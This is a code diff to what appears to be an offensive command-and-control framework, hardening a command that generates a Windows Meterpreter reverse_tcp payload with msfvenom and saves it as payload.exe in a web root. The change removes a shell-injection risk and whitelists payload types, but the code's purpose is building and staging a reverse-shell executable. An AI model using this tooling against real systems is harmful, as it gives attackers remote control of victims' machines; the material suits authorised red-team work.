@@ -246,6 +246,7 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                     "self.params['lhost'] o lport deben estar establecidos. Usa 'assign self.params['lhost'] <ip>'"
                 )
             else:
+                setpayload = "windows/meterpreter/reverse_tcp"
                 if len(args) == 1:
                     setpayload = "windows/meterpreter/reverse_tcp"
                 elif len(args) == 2:
@@ -255,8 +256,29 @@ class CommandAndControlMigratedCommandSet(LazyOwnCommandSet):
                         setpayload = "windows/x64/meterpreter/reverse_tcp"
 
                 payload_path = os.path.join(web_root, "payload.exe")
-                msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={self.params['lhost']} LPORT={lport} -f exe -o {payload_path}"
-                subprocess.run(msfvenom_cmd, shell=True, check=True)
+                if setpayload not in (
+                    "windows/meterpreter/reverse_tcp",
+                    "windows/x64/meterpreter/reverse_tcp",
+                ):
+                    print_error(f"Unsupported payload: {setpayload}")
+                    return
+                if not check_lhost(self.params["lhost"]):
+                    return
+                subprocess.run(
+                    [
+                        "msfvenom",
+                        "-p",
+                        setpayload,
+                        f"LHOST={self.params['lhost']}",
+                        f"LPORT={lport}",
+                        "-f",
+                        "exe",
+                        "-o",
+                        payload_path,
+                    ],
+                    shell=False,
+                    check=True,
+                )
                 print_msg("Payload created successfully at: " + payload_path)
 
                 xml_content = f"""<?xml version="1.0"?>
